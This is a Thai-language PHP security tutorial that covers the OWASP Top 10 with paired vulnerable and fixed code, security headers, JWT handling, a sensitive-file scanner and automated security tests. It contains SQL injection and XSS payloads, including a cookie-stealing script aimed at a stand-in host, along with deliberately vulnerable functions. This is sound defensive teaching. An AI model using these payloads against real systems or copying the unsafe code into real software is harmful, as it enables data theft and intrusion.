# Part 92: Security Advanced ใน PHP

## บทนำ

Security เป็นหนึ่งในสิ่งสำคัญที่สุดในการพัฒนา Web Application OWASP (Open Web Application Security Project) เผยแพร่ "OWASP Top 10" ซึ่งเป็นรายการช่องโหว่ที่พบบ่อยและอันตรายที่สุด

---

## OWASP Top 10 ใน PHP

### 1. Injection (SQL Injection)

```php
<?php

// ❌ SQL Injection Vulnerable
function getUserByName_UNSAFE(string $name): array
{
    $db = new \PDO('mysql:host=localhost;dbname=mydb', 'user', 'pass');
    // ถ้า $name = "' OR '1'='1" จะ bypass ได้ทุก record
    $result = $db->query("SELECT * FROM users WHERE name = '{$name}'");
    return $result->fetchAll();
}

// Test: getUserByName_UNSAFE("' OR '1'='1' --")
// SQL: SELECT * FROM users WHERE name = '' OR '1'='1' --'
// ผลลัพธ์: ดึงข้อมูล users ทั้งหมด!

// ❌ ยิ่งแย่กว่า - Drop Table
// getUserByName_UNSAFE("'; DROP TABLE users; --")

// ✅ Safe - Prepared Statements
function getUserByName_SAFE(string $name): array
{
    $db = new \PDO('mysql:host=localhost;dbname=mydb', 'user', 'pass');
    $db->setAttribute(\PDO::ATTR_ERRMODE, \PDO::ERRMODE_EXCEPTION);
    
    $stmt = $db->prepare("SELECT * FROM users WHERE name = :name");
    $stmt->execute([':name' => $name]);
    
    return $stmt->fetchAll(\PDO::FETCH_ASSOC);
}

// ✅ Laravel Eloquent - Safe by default
$user = User::where('name', $name)->first();

// ✅ Laravel Raw Queries - ต้องใช้ Bindings
$users = \DB::select(
    "SELECT * FROM users WHERE name = ? AND active = ?",
    [$name, 1]
);

// ✅ whereRaw ต้องใช้ Bindings เสมอ
$users = User::whereRaw('LOWER(name) = ?', [strtolower($name)])->get();

// ❌ อย่าใช้แบบนี้แม้จะเป็น whereRaw
$users = User::whereRaw("name = '{$name}'")->get(); // VULNERABLE!

// Advanced: SQL Injection ผ่าน ORDER BY
function getOrderedUsers_UNSAFE(string $column, string $direction): array
{
    // ❌ Dangerous: ORDER BY ไม่รองรับ Prepared Statements
    return \DB::select("SELECT * FROM users ORDER BY {$column} {$direction}");
}

// ✅ Whitelist Validation
function getOrderedUsers_SAFE(string $column, string $direction): array
{
    $allowedColumns = ['name', 'email', 'created_at'];
    $allowedDirections = ['ASC', 'DESC'];
    
    if (!in_array($column, $allowedColumns)) {
        throw new \InvalidArgumentException("Invalid sort column");
    }
    
    if (!in_array(strtoupper($direction), $allowedDirections)) {
        throw new \InvalidArgumentException("Invalid sort direction");
    }
    
    return \DB::select("SELECT * FROM users ORDER BY {$column} {$direction}");
}
```

---

### 2. XSS (Cross-Site Scripting)

```php
<?php

// ❌ Reflected XSS
function searchResults_UNSAFE(string $query): string
{
    // ถ้า $query = "<script>alert('XSS')</script>"
    return "<h1>Results for: {$query}</h1>"; // XSS!
}

// ✅ Escape Output
function searchResults_SAFE(string $query): string
{
    $escaped = htmlspecialchars($query, ENT_QUOTES | ENT_HTML5, 'UTF-8');
    return "<h1>Results for: {$escaped}</h1>";
}

// ✅ Blade Template - Auto-escaping
// {{ $userInput }} - Escaped automatically
// {!! $userInput !!} - Raw HTML, DANGEROUS เว้นแต่คุณไว้ใจ content

// ❌ Stored XSS ผ่าน Database
// ถ้าเก็บ '<script>fetch("evil.com?c="+document.cookie)</script>'
// แล้วแสดงผลโดยไม่ Escape

// ✅ Sanitize เมื่อรับข้อมูล
class UserInputSanitizer
{
    public function sanitizeHtml(string $html): string
    {
        // ใช้ HTML Purifier library
        $config = \HTMLPurifier_Config::createDefault();
        $config->set('HTML.Allowed', 'p,strong,em,ul,ol,li,a[href],img[src|alt]');
        $config->set('URI.AllowedSchemes', ['http' => true, 'https' => true]);
        
        $purifier = new \HTMLPurifier($config);
        return $purifier->purify($html);
    }
    
    public function sanitizeText(string $text): string
    {
        return htmlspecialchars(strip_tags($text), ENT_QUOTES | ENT_HTML5, 'UTF-8');
    }
}

// Content Security Policy (CSP)
class SecurityHeadersMiddleware
{
    public function handle(Request $request, \Closure $next): Response
    {
        $response = $next($request);
        
        $nonce = base64_encode(random_bytes(16));
        session(['csp_nonce' => $nonce]);
        
        $csp = implode('; ', [
            "default-src 'self'",
            "script-src 'self' 'nonce-{$nonce}' https://cdn.jsdelivr.net",
            "style-src 'self' 'nonce-{$nonce}' https://fonts.googleapis.com",
            "img-src 'self' data: https:",
            "font-src 'self' https://fonts.gstatic.com",
            "connect-src 'self'",
            "frame-ancestors 'none'",
            "form-action 'self'",
            "base-uri 'self'",
            "upgrade-insecure-requests",
        ]);
        
        $response->headers->set('Content-Security-Policy', $csp);
        $response->headers->set('X-Frame-Options', 'DENY');
        $response->headers->set('X-Content-Type-Options', 'nosniff');
        $response->headers->set('Referrer-Policy', 'strict-origin-when-cross-origin');
        $response->headers->set('Permissions-Policy', 'camera=(), microphone=(), geolocation=()');
        
        if ($request->secure()) {
            $response->headers->set(
                'Strict-Transport-Security',
                'max-age=31536000; includeSubDomains; preload'
            );
        }
        
        return $response;
    }
}
```

---

### 3. CSRF Protection

```php
<?php

// Laravel CSRF Token - Built-in Protection
// ใส่ใน Form
// <form method="POST">
//     @csrf
//     ...
// </form>

// CSRF Token ใน API
class ApiCsrfMiddleware
{
    private array $except = [
        'webhook/*',
        'api/public/*',
    ];
    
    public function handle(Request $request, \Closure $next): Response
    {
        if ($this->shouldSkip($request)) {
            return $next($request);
        }
        
        $token = $request->header('X-CSRF-TOKEN')
            ?? $request->header('X-XSRF-TOKEN')
            ?? $request->input('_token');
        
        if (!$token || !hash_equals(session('_token', ''), $token)) {
            throw new TokenMismatchException("CSRF token mismatch");
        }
        
        return $next($request);
    }
    
    private function shouldSkip(Request $request): bool
    {
        if ($request->isMethod('GET') || $request->isMethod('HEAD')) {
            return true;
        }
        
        foreach ($this->except as $pattern) {
            if ($request->is($pattern)) return true;
        }
        
        return false;
    }
}

// Double Submit Cookie Pattern (SPA)
class SpaController extends Controller
{
    public function getCsrfCookie(Request $request): Response
    {
        return response()->noContent()
            ->withCookie(
                cookie(
                    name: 'XSRF-TOKEN',
                    value: $request->session()->token(),
                    minutes: 120,
                    httpOnly: false, // Frontend ต้องอ่านได้
                    sameSite: 'strict'
                )
            );
    }
}
```

---

### 4. Authentication Security

```php
<?php

class SecureAuthService
{
    // Rate Limiting สำหรับ Login
    public function login(string $email, string $password, Request $request): array
    {
        $key = 'login_attempts:' . md5($email . $request->ip());
        $maxAttempts = 5;
        $lockoutTime = 900; // 15 minutes
        
        $attempts = (int)\Cache::get($key, 0);
        
        if ($attempts >= $maxAttempts) {
            $ttl = \Cache::getRedis()->ttl($key);
            throw new \TooManyLoginAttemptsException(
                "Too many login attempts. Try again in {$ttl} seconds."
            );
        }
        
        $user = User::where('email', $email)->first();
        
        if (!$user || !password_verify($password, $user->password)) {
            \Cache::put($key, $attempts + 1, $lockoutTime);
            
            // Log failed attempt
            logger()->warning('Failed login attempt', [
                'email' => $email,
                'ip' => $request->ip(),
                'attempts' => $attempts + 1,
            ]);
            
            throw new \InvalidCredentialsException("Invalid credentials");
        }
        
        // Clear attempts on success
        \Cache::forget($key);
        
        // Log successful login
        logger()->info('User logged in', [
            'user_id' => $user->id,
            'ip' => $request->ip(),
        ]);
        
        return ['token' => $user->createToken('api')->plainTextToken];
    }
    
    // Secure Password Reset
    public function initiatePasswordReset(string $email): void
    {
        $user = User::where('email', $email)->first();
        
        // ไม่บอกว่า Email ไม่พบ (Prevent User Enumeration)
        if (!$user) return;
        
        $token = bin2hex(random_bytes(32));
        $hashedToken = hash('sha256', $token);
        
        \DB::table('password_resets')->upsert([
            'email' => $email,
            'token' => $hashedToken,
            'created_at' => now(),
        ], ['email']);
        
        // ส่งแค่ Token ที่ยังไม่ Hash
        Mail::to($email)->send(new PasswordResetMail($token));
    }
    
    public function resetPassword(string $token, string $email, string $newPassword): void
    {
        $hashedToken = hash('sha256', $token);
        
        $reset = \DB::table('password_resets')
            ->where('email', $email)
            ->where('token', $hashedToken)
            ->where('created_at', '>', now()->subHour()) // 1 hour expiry
            ->first();
        
        if (!$reset) {
            throw new \InvalidTokenException("Invalid or expired reset token");
        }
        
        $user = User::where('email', $email)->firstOrFail();
        
        $user->update([
            'password' => bcrypt($newPassword),
            'remember_token' => null, // Invalidate remember tokens
        ]);
        
        // Delete used token
        \DB::table('password_resets')->where('email', $email)->delete();
        
        // Revoke all tokens
        $user->tokens()->delete();
    }
}
```

---

### 5. JWT Security

```php
<?php

use Firebase\JWT\JWT;
use Firebase\JWT\Key;

class JWTService
{
    private string $secret;
    private int $accessTokenTtl = 900; // 15 minutes
    private int $refreshTokenTtl = 2592000; // 30 days
    
    public function __construct()
    {
        $this->secret = config('jwt.secret');
        
        if (strlen($this->secret) < 32) {
            throw new \RuntimeException("JWT secret must be at least 32 characters");
        }
    }
    
    public function generateAccessToken(User $user): string
    {
        $payload = [
            'iss' => config('app.url'), // Issuer
            'aud' => config('app.url'), // Audience
            'sub' => $user->id,          // Subject
            'iat' => time(),             // Issued at
            'exp' => time() + $this->accessTokenTtl, // Expiry
            'nbf' => time(),             // Not before
            'jti' => bin2hex(random_bytes(16)), // JWT ID (unique)
            'data' => [
                'email' => $user->email,
                'role' => $user->role,
            ]
        ];
        
        return JWT::encode($payload, $this->secret, 'HS256');
    }
    
    public function generateRefreshToken(User $user): string
    {
        $token = bin2hex(random_bytes(32));
        $hashedToken = hash('sha256', $token);
        
        \DB::table('refresh_tokens')->insert([
            'user_id' => $user->id,
            'token' => $hashedToken,
            'expires_at' => now()->addSeconds($this->refreshTokenTtl),
            'created_at' => now(),
        ]);
        
        return $token;
    }
    
    public function validateAccessToken(string $token): ?object
    {
        try {
            $payload = JWT::decode($token, new Key($this->secret, 'HS256'));
            
            // ตรวจสอบ Revocation List
            if ($this->isRevoked($payload->jti)) {
                return null;
            }
            
            return $payload;
        } catch (\Exception $e) {
            return null;
        }
    }
    
    public function revokeToken(string $jti): void
    {
        // เพิ่มเข้า Blacklist
        \Cache::put("jwt:blacklist:{$jti}", true, $this->accessTokenTtl);
    }
    
    private function isRevoked(string $jti): bool
    {
        return \Cache::has("jwt:blacklist:{$jti}");
    }
    
    public function refreshTokens(string $refreshToken): array
    {
        $hashedToken = hash('sha256', $refreshToken);
        
        $stored = \DB::table('refresh_tokens')
            ->where('token', $hashedToken)
            ->where('expires_at', '>', now())
            ->first();
        
        if (!$stored) {
            throw new \InvalidTokenException("Invalid or expired refresh token");
        }
        
        // Rotate refresh token (Prevent Replay)
        \DB::table('refresh_tokens')
            ->where('token', $hashedToken)
            ->delete();
        
        $user = User::findOrFail($stored->user_id);
        
        return [
            'access_token' => $this->generateAccessToken($user),
            'refresh_token' => $this->generateRefreshToken($user),
        ];
    }
}
```

---

### 6. File Upload Security

```php
<?php

class SecureFileUploadService
{
    private array $allowedMimeTypes = [
        'image/jpeg', 'image/png', 'image/gif', 'image/webp',
    ];
    
    private array $allowedExtensions = ['jpg', 'jpeg', 'png', 'gif', 'webp'];
    private int $maxFileSize = 5 * 1024 * 1024; // 5MB
    
    public function upload(UploadedFile $file): string
    {
        $this->validateFile($file);
        
        // Generate safe filename
        $extension = $file->getClientOriginalExtension();
        $filename = bin2hex(random_bytes(16)) . '.' . $extension;
        
        // Store outside webroot หรือใน S3
        $path = $file->storeAs('uploads/images', $filename, 'private');
        
        // Strip EXIF data (ป้องกันข้อมูล Geolocation)
        if (in_array($file->getMimeType(), ['image/jpeg', 'image/png'])) {
            $this->stripExifData(storage_path('app/private/' . $path));
        }
        
        return $path;
    }
    
    private function validateFile(UploadedFile $file): void
    {
        // ตรวจสอบขนาด
        if ($file->getSize() > $this->maxFileSize) {
            throw new \InvalidArgumentException("File too large");
        }
        
        // ตรวจสอบ MIME Type จาก Content (ไม่ใช่ Header)
        $finfo = new \finfo(FILEINFO_MIME_TYPE);
        $actualMimeType = $finfo->file($file->getPathname());
        
        if (!in_array($actualMimeType, $this->allowedMimeTypes)) {
            throw new \InvalidArgumentException("Invalid file type: {$actualMimeType}");
        }
        
        // ตรวจสอบ Extension
        $extension = strtolower($file->getClientOriginalExtension());
        if (!in_array($extension, $this->allowedExtensions)) {
            throw new \InvalidArgumentException("Invalid file extension");
        }
        
        // ตรวจสอบว่าเป็น Image จริงๆ
        if (str_starts_with($actualMimeType, 'image/')) {
            $imageInfo = getimagesize($file->getPathname());
            if ($imageInfo === false) {
                throw new \InvalidArgumentException("File is not a valid image");
            }
        }
        
        // Scan for Malware (ถ้ามี ClamAV)
        if (class_exists('\ClamAV\Daemon')) {
            $scanner = new \ClamAV\Daemon();
            $result = $scanner->scan($file->getPathname());
            if ($result->isInfected()) {
                throw new \SecurityException("Malware detected in file");
            }
        }
    }
    
    private function stripExifData(string $filePath): void
    {
        if (!extension_loaded('exif')) return;
        
        $imageType = exif_imagetype($filePath);
        
        if ($imageType === IMAGETYPE_JPEG) {
            $image = imagecreatefromjpeg($filePath);
            imagejpeg($image, $filePath, 85);
            imagedestroy($image);
        }
    }
    
    public function getSecureUrl(string $path): string
    {
        // Generate Temporary Signed URL
        return \Storage::temporaryUrl($path, now()->addMinutes(30));
    }
}
```

---

### 7. Mass Assignment Protection

```php
<?php

// ❌ Vulnerable to Mass Assignment
class User extends Model
{
    protected $guarded = []; // ❌ ไม่มีการ Guard
    
    // ผู้โจมตีส่ง: { "is_admin": true, "role": "admin" }
}

// ✅ Fillable Whitelist
class User extends Model
{
    protected $fillable = [
        'name',
        'email',
        'password',
        'phone',
    ];
    
    // Fields ที่ไม่อยู่ใน $fillable จะถูก Ignore
    // is_admin, role, email_verified_at ถูก Protect
}

// ✅ หรือใช้ Guarded Blacklist
class UserProfile extends Model
{
    protected $guarded = [
        'user_id',      // Cannot be mass assigned
        'is_verified',  // Cannot be mass assigned
        'trust_score',  // Cannot be mass assigned
    ];
}

// ✅ Request Validation แยกกัน
class UpdateProfileRequest extends FormRequest
{
    public function rules(): array
    {
        return [
            'name' => 'required|string|max:255',
            'phone' => 'nullable|string|max:20',
            'bio' => 'nullable|string|max:500',
            // ❌ ไม่ include: is_admin, role, email
        ];
    }
}

// Controller
public function update(UpdateProfileRequest $request): JsonResponse
{
    $request->user()->update($request->validated()); // Safe!
    return response()->json(['success' => true]);
}
```

---

## Penetration Testing Basics

```php
<?php

// Security Scanner
class SecurityScanner
{
    private array $results = [];
    
    public function scan(string $url): array
    {
        $this->checkHeaders($url);
        $this->checkHttps($url);
        $this->checkSensitiveFiles($url);
        
        return $this->results;
    }
    
    private function checkHeaders(string $url): void
    {
        $headers = get_headers($url, 1);
        
        $requiredHeaders = [
            'X-Frame-Options',
            'X-Content-Type-Options',
            'Content-Security-Policy',
            'Strict-Transport-Security',
        ];
        
        foreach ($requiredHeaders as $header) {
            if (!isset($headers[$header])) {
                $this->results[] = [
                    'severity' => 'medium',
                    'issue' => "Missing security header: {$header}",
                ];
            }
        }
    }
    
    private function checkSensitiveFiles(string $baseUrl): void
    {
        $sensitiveFiles = [
            '/.env',
            '/.git/config',
            '/phpinfo.php',
            '/composer.json',
            '/composer.lock',
            '/.htpasswd',
            '/backup.sql',
            '/database.sql',
        ];
        
        foreach ($sensitiveFiles as $file) {
            $ch = curl_init($baseUrl . $file);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
            curl_setopt($ch, CURLOPT_TIMEOUT, 5);
            curl_exec($ch);
            $statusCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
            curl_close($ch);
            
            if ($statusCode === 200) {
                $this->results[] = [
                    'severity' => 'critical',
                    'issue' => "Sensitive file exposed: {$file}",
                    'url' => $baseUrl . $file,
                ];
            }
        }
    }
    
    private function checkHttps(string $url): void
    {
        if (!str_starts_with($url, 'https://')) {
            $this->results[] = [
                'severity' => 'high',
                'issue' => "Site not using HTTPS",
            ];
        }
    }
}
```

---

## Workshop: Security Audit

### Audit Checklist

```php
<?php

class SecurityAudit
{
    public function runAudit(): array
    {
        return [
            'authentication' => $this->auditAuthentication(),
            'authorization' => $this->auditAuthorization(),
            'data_validation' => $this->auditDataValidation(),
            'encryption' => $this->auditEncryption(),
            'logging' => $this->auditLogging(),
        ];
    }
    
    private function auditAuthentication(): array
    {
        return [
            'password_min_length' => strlen(config('auth.password_min')) >= 8,
            'bcrypt_cost' => PASSWORD_BCRYPT_DEFAULT_COST >= 12,
            'rate_limiting' => $this->checkRateLimiting(),
            '2fa_available' => class_exists(\PragmaRX\Google2FA\Google2FA::class),
            'session_secure' => config('session.secure', false),
            'session_httponly' => config('session.http_only', false),
        ];
    }
    
    private function auditEncryption(): array
    {
        return [
            'app_key_length' => strlen(config('app.key')) >= 32,
            'https_forced' => config('app.url', '') !== '',
            'db_encryption' => env('DB_ENCRYPT') === 'true',
        ];
    }
}

// Automated Security Tests
class SecurityTest extends TestCase
{
    public function test_sql_injection_prevention(): void
    {
        $payload = "' OR '1'='1' --";
        
        $response = $this->getJson("/api/users?search={$payload}");
        
        // ต้องไม่ Return ข้อมูลทั้งหมด
        $response->assertJsonCount(0, 'data');
    }
    
    public function test_xss_prevention(): void
    {
        $payload = '<script>alert("XSS")</script>';
        
        $response = $this->postJson('/api/products', [
            'name' => $payload,
            'price' => 100,
        ]);
        
        $response->assertSuccessful();
        
        $product = $response->json('data');
        
        // ต้อง Escape HTML
        $this->assertStringNotContainsString('<script>', $product['name']);
        $this->assertStringContainsString('&lt;script&gt;', $product['name']);
    }
    
    public function test_csrf_protection(): void
    {
        // Request โดยไม่มี CSRF Token
        $response = $this->post('/web/profile', [
            'name' => 'Hacker'
        ]);
        
        $response->assertStatus(419); // CSRF token mismatch
    }
    
    public function test_rate_limiting(): void
    {
        for ($i = 0; $i < 10; $i++) {
            $response = $this->postJson('/api/auth/login', [
                'email' => 'test@example.com',
                'password' => 'wrong'
            ]);
        }
        
        // ครั้งที่ 11 ต้อง Rate Limited
        $response = $this->postJson('/api/auth/login', [
            'email' => 'test@example.com',
            'password' => 'wrong'
        ]);
        
        $response->assertStatus(429); // Too Many Requests
    }
}
```

---

## Security Best Practices

```
✅ Authentication:
   - Password: bcrypt/argon2 cost >= 12
   - Rate limiting ที่ Login endpoint
   - Account lockout หลัง X failed attempts
   - 2FA สำหรับ Admin accounts
   - Secure Password Reset flow

✅ Authorization:
   - ตรวจสอบ Permission ทุก Endpoint
   - RBAC หรือ ABAC
   - Object-level Authorization (ตรวจว่า User เป็นเจ้าของ Resource)

✅ Data:
   - Validate ทุก Input
   - Escape ทุก Output
   - Parameterized Queries เสมอ
   - Encrypt Sensitive Data at rest

✅ Session:
   - Secure + HttpOnly Cookies
   - SameSite=Strict/Lax
   - Short session timeout
   - Regenerate Session ID หลัง Login

✅ Headers:
   - CSP
   - HSTS (HTTPS only)
   - X-Frame-Options
   - X-Content-Type-Options

✅ Dependencies:
   - Audit ด้วย composer audit
   - Update ให้ทันสมัยเสมอ
   - ใช้ Dependabot/Renovate
```

---

*Security ไม่ใช่ Feature เพิ่มเติม - เป็น Requirement พื้นฐาน*
